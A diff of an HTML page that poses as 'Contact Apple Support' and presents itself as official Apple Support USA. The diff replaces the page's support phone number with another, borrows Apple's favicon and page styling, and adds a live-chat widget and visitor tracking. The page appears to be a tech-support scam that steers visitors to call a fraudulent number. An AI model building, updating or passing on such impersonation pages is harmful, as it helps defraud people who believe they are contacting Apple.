@@ -1,116 +1,251 @@
-
 <!DOCTYPE html>
 <html lang="en">
-   <head>
-      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-      <meta name="viewport" content="width=device-width, initial-scale=1">
-      <title>Call Me: +1-(843) 437-1691 Device Support Assistance</title>
-      <style>
-         body{
-            margin:0;
-            font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial;
-            background:#f2f2f5;
-            display:flex;
-            align-items:center;
-            justify-content:center;
-            min-height:100vh
-         }
-         .card{
-            background:#fff;
-            width:90%;
-            max-width:650px;
-            padding:50px 40px;
-            border-radius:28px;
-            text-align:center;
-            box-shadow:0 30px 60px rgba(0,0,0,0.08)
-         }
-         .logo{
-            font-size:42px;
-            margin-bottom:20px
-         }
-         h1{
-            font-size:38px;
-            margin:10px 0;
-            font-weight:600;
-            color:#1d1d1f
-         }
-         p{
-            font-size:18px;
-            color:#6e6e73;
-            margin-top:10px;
-            line-height:1.5
-         }
-         .call-btn{
-            display:inline-block;
-            margin-top:35px;
-            padding:18px 40px;
-            border-radius:40px;
-            background:linear-gradient(90deg,#2d6cdf,#3a7bfd);
-            color:#fff;
-            font-size:20px;
-            font-weight:600;
-            text-decoration:none;
-            transition:.2s ease
-         }
-         .call-btn:hover{
-            transform:translateY(-2px);
-            box-shadow:0 12px 30px rgba(0,0,0,0.15)
-         }
-         .number{
-            margin-top:30px;
-            font-size:30px;
-            font-weight:600;
-            color:#1d1d1f
-         }
-         .available{
-            margin-top:20px;
-            font-size:14px;
-            letter-spacing:1px;
-            color:#8e8e93
-         }
-         .footer{
-            margin-top:40px;
-            font-size:13px;
-            color:#8e8e93;
-            line-height:1.5
-         }
-      </style>
-   </head>
-   <body>
-      <div class="card">
-         <div class="logo"></div>
-         <h1>Contact Apple Support</h1>
-         <p>Need help with your device? Our team is ready to assist you.</p>
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Device Support Assistance</title>
+  <link rel="icon" href="https://www.apple.com/favicon.ico">
+  <!-- Google tag (gtag.js) -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-VCBLXTQNVQ"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){ dataLayer.push(arguments); }
+    gtag('js', new Date());
+    gtag('config', 'G-VCBLXTQNVQ');
+  </script>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
 
-         <a href="tel:+18434371691" class="call-btn">📞 Call Support Now</a>
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      background: #ffffff;
+      color: #1d1d1f;
+      text-align: center;
+    }
 
-         <div class="available">AVAILABLE 24/7 IN THE US</div>
+    header {
+      background-color: #1d1d1f;
+      padding: 15px 0;
+      margin-bottom: 40px;
+    }
 
-         <div class="number">+1-(843) 437-1691</div>
+    .apple-logo {
+      color: white;
+      font-size: 24px;
+      text-decoration: none;
+    }
 
-         <div class="footer">
-            Official Apple Support USA. Standard call rates may apply.<br>
-            Standard call rates may apply.
-         </div>
+    .container {
+      max-width: 500px;
+      margin: 0 auto;
+      padding: 0 20px 20px;
+    }
+
+    h1 {
+      font-size: 40px;
+      font-weight: 600;
+      letter-spacing: -0.5px;
+      margin-bottom: 15px;
+    }
+
+    .subhead {
+      font-size: 19px;
+      color: #515154;
+      line-height: 1.47;
+      margin-bottom: 30px;
+    }
+
+    .call-btn {
+      display: inline-block;
+      background-color: #0071e3;
+      color: #ffffff;
+      text-decoration: none;
+      padding: 12px 30px;
+      font-size: 17px;
+      font-weight: 400;
+      border-radius: 980px;
+      margin-bottom: 40px;
+      transition: background 0.2s;
+    }
+
+    .call-btn:hover {
+      background-color: #0077ed;
+    }
+
+    .status-container {
+      margin-top: 20px;
+    }
+
+    .availability {
+      font-size: 12px;
+      font-weight: 600;
+      color: #86868b;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      margin-bottom: 8px;
+    }
+
+    .number {
+      font-size: 32px;
+      font-weight: 600;
+      color: #1d1d1f;
+      margin-bottom: 40px;
+    }
+
+    .divider {
+      height: 1px;
+      background-color: #d2d2d7;
+      margin: 20px 0;
+    }
+
+    /* ---- More to Explore (image replica) ---- */
+    .explore-section {
+      margin-top: 40px;
+      padding: 20px 0 10px;
+      border-top: 1px solid #d2d2d7;
+    }
+
+    .explore-title {
+      font-size: 24px;
+      font-weight: 600;
+      letter-spacing: -0.3px;
+      margin-bottom: 20px;
+      color: #1d1d1f;
+    }
+
+    .explore-grid {
+      display: flex;
+      flex-direction: column;
+      gap: 30px;
+      align-items: center;
+    }
+
+    .explore-card {
+      max-width: 320px;
+      width: 100%;
+      text-align: left;
+    }
+
+    .explore-card h3 {
+      font-size: 20px;
+      font-weight: 600;
+      margin-bottom: 6px;
+      color: #1d1d1f;
+    }
+
+    .explore-card p {
+      font-size: 15px;
+      color: #515154;
+      line-height: 1.4;
+      margin-bottom: 12px;
+    }
+
+    .explore-link {
+      font-size: 15px;
+      font-weight: 500;
+      color: #0071e3;
+      text-decoration: none;
+      display: inline-block;
+      border-bottom: 1px solid transparent;
+      transition: border-color 0.2s;
+    }
+
+    .explore-link:hover {
+      border-bottom-color: #0071e3;
+    }
+
+    .explore-link::after {
+      content: " ›";
+      font-weight: 300;
+    }
+
+    /* optional small note */
+    .footnote {
+      margin-top: 40px;
+      font-size: 12px;
+      color: #86868b;
+      padding-bottom: 20px;
+    }
+
+    /* responsive */
+    @media (min-width: 600px) {
+      .explore-grid {
+        flex-direction: row;
+        justify-content: center;
+        align-items: flex-start;
+        flex-wrap: wrap;
+      }
+      .explore-card {
+        max-width: 240px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- header -->
+  <header>
+    <a href="#" class="apple-logo"></a>
+  </header>
+
+  <div class="container">
+    <h1>Contact Apple Support</h1>
+    <p class="subhead">Need help with your device? Our team is ready to assist you.</p>
+
+    <!-- updated toll-free number -->
+    <a href="tel:+18885279538" class="call-btn">📞 Call Support Now</a>
+
+    <div class="status-container">
+      <div class="availability">AVAILABLE 24/7 IN THE US</div>
+      <div class="number">1-888-527-9538</div>
+    </div>
+
+    <div class="divider"></div>
+
+    <!-- "More to Explore" section – exactly as in the image description -->
+    <div class="explore-section">
+      <h2 class="explore-title">More to Explore</h2>
+
+      <div class="explore-grid">
+        <!-- Apple Support App -->
+        <div class="explore-card">
+          <h3>Apple Support App</h3>
+          <p>Get help for all of your Apple products in one place, or connect with an expert.</p>
+          <a href="#" class="explore-link">Download</a>
+        </div>
+
+        <!-- Today at Apple -->
+        <div class="explore-card">
+          <h3>Today at Apple</h3>
+          <p>Learn, create and be inspired in hands-on sessions at your Apple Store.</p>
+          <a href="#" class="explore-link">Sign up</a>
+        </div>
       </div>
+    </div>
 
-<!-- Default Statcounter code for apple charge
-https://applecharge.z33.web.core.windows.net/ -->
-<script type="text/javascript">
-var sc_project=13209602; 
-var sc_invisible=1; 
-var sc_security="0dcb0495"; 
-</script>
-<script type="text/javascript"
-src="https://www.statcounter.com/counter/counter.js"
-async></script>
-<noscript><div class="statcounter"><a title="Web Analytics"
-href="https://statcounter.com/" target="_blank"><img
-class="statcounter"
-src="https://c.statcounter.com/13209602/0/0dcb0495/1/"
-alt="Web Analytics"
-referrerPolicy="no-referrer-when-downgrade"></a></div></noscript>
-<!-- End of Statcounter Code -->
+    <!-- footer / fine print -->
+    <div class="footnote">
+      Official Apple Support USA. Standard call rates may apply.
+    </div>
+  </div>
 
-   </body>
+  <!-- Tawk.to Script -->
+  <script type="text/javascript">
+    var Tawk_API = Tawk_API || {}, Tawk_LoadStart = new Date();
+    (function() {
+      var s1 = document.createElement("script"), s0 = document.getElementsByTagName("script")[0];
+      s1.async = true;
+      s1.src = 'https://embed.tawk.to/68556f6126a9b719089c1716/1iu6rm62a';
+      s1.charset = 'UTF-8';
+      s1.setAttribute('crossorigin', '*');
+      s0.parentNode.insertBefore(s1, s0);
+    })();
+  </script>
+  <!-- End Tawk.to -->
+
+</body>
 </html>
